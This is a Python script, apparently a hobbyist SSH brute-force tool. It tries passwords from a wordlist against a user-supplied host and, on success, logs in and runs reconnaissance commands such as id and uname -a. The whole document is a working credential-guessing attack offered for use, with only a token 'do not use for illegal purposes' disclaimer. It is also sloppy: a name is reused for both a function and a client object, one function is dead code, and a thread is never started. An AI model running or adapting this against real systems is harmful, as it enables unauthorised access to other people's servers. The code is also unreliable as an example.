from subprocess import TimeoutExpired
import threading,time
import paramiko , sys , os , socket , termcolor
from paramiko.client import SSHClient
print("Fully made by leafyvinnie , do not use for illegal purposes :^)")
host = input("[+] Enter IP address: ")
user = input("[+] Username: ")
wordlist = input("[+] Enter wordlist: ") 
port = input("[+] Enter port: ")
stop_flag = 1
def client(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host, port=port, username=user, password=password)
        stop_flag = 1
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code 

if os.path.exists(wordlist) == False:
    print("[-] File cannot be found")
    exit(1)
print("[+] Brute force has started")
print("\n")
commands = [
    "pwd",
    "id",
    "uname -a",
    "df -h"]
def bruteforce():
    
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host, port=port, username=user, password=password,timeout=0.3)
        stop_flag = 1
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
        print(e)
    ssh.close()
    exit(1)
with open(wordlist,'r') as file:
        for line in file.readlines():
            password = line.strip()
            try:
                response = client(password)
                if response == 0:
                    print(termcolor.colored(("[+] Found password:" + password + ' For user ' + user),'green'))
                    break
                elif response == 1:
                        print(termcolor.colored(("[-] Password incorrect " + password),'red'))
                elif response == 2:
                        print("[-] Unable to connect")
                        exit(1)
            except Exception as e:
                    print(e)
                    pass

    # initialize the SSH client
        client = paramiko.SSHClient()
    # add to known hosts
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=host, username=user, password=password,)
        except:
            print("[!] Cannot connect to the SSH Server")
            exit()
        for command in commands:
            print("="*50, command, "="*50)
            stdin, stdout, stderr = client.exec_command(command)
            print(termcolor.colored(stdout.read().decode(),'green'))
            err = stderr.read().decode()
            if err:
                print(termcolor.colored(err),'red')


t = threading.Thread(target=bruteforce, args=())
time.sleep(0.5)